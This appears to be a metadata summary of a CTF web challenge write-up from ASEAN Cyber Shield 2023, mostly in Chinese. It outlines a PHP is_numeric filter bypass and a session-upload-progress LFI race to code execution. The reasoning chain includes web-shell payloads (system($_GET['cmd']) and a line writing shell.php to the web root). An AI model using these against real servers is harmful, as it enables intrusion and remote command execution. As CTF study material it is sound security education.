...
- session_upload_progress_enabled
- include_once
- 1MB padding race
- /tmp/sess_XXXXX
- shell.php写
...
quality: high
full_path: ASEAN_Cyber_Shield_(ACS)_CTF_2023_[WEB].full.md
meta_path: ASEAN_Cyber_Shield_(ACS)_CTF_2023_[WEB].meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'ASEAN Cyber Shield (ACS) CTF 2023 [WEB]。ASEAN ACS CTF 2023 — is_numeric 弱类型 + preg_match /^[0-9...]/i %09 旁路 + PHP_SESSION_UPLOAD_PROGRESS LFI race 写 shell.php。。关键路径：弱类型: is_numeric($num) 接受 '' 091''...'
category: web
subcategory: lfi
...
contest_type: open
wp_url: https://www.ctfiot.com/147517.html
reasoning_chain:
- index.php num+page 参数 + is_numeric + preg_match /^[0-9+\/*e ]/i → 触发点：弱类型绕过
- 假设：is_numeric 接受 '\t1' '\n1' '\r1' '\x0b1' '\x0c1' '\x091' → 动作：fuzz
- 观察：%091 旁路 preg_match 仍 is_numeric → 假设：触发 include_once
- $page 过滤 flag|php|conf|*|'|" → 触发点：LFI 过滤名单
- 假设：可走 /tmp/sess_XXXXX 临时文件 → 动作：PHP_SESSION_UPLOAD_PROGRESS
- 动作：multipart 上传 PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET['cmd']); ?> → 假设：写 /tmp/sess_<id>
- 多线程 race：POST 上传 + GET include_once(/tmp/sess_xxx) 同时进行 → 1MB padding 保证文件仍在
- 观察：include_once 触发 PHP 代码执行 → cmd=ls / 拿 flag
- 动作：写 shell.php <form data PHP_SESSION_UPLOAD_PROGRESS=<?php phpinfo();fputs(fopen('/var/www/html/shell.php','w'),...)?>>
failed_attempts:
- 试图直接 /tmp 路径读取 → 失败：session 文件内容是序列化数组无 PHP
- 试图用 php://filter → 失败：page 过滤 php/conf/.
- 试图单次塞 session → 失败：PHP session_start 后立即 unlink 需 race
key_observations:
- is_numeric + preg_match /^[0-9...]/i = %09 (tab) 旁路是经典组合
- PHP_SESSION_UPLOAD_PROGRESS 是 LFI-to-RCE 必杀 (前提 session.upload_progress.enabled=on)
- race 1MB padding 保证 include 时文件活过 GC
- multipart form 含 PHP_SESSION_UPLOAD_PROGRESS 字段触发 session 内容可控
- session.save_path=/tmp 是默认配置意味着固定路径
prerequisites:
- PHP 弱类型（is_numeric + 字符集 fuzz）
- PHP session + LFI 经典利用链
- Python threading/multiprocessing race 脚本编写
---
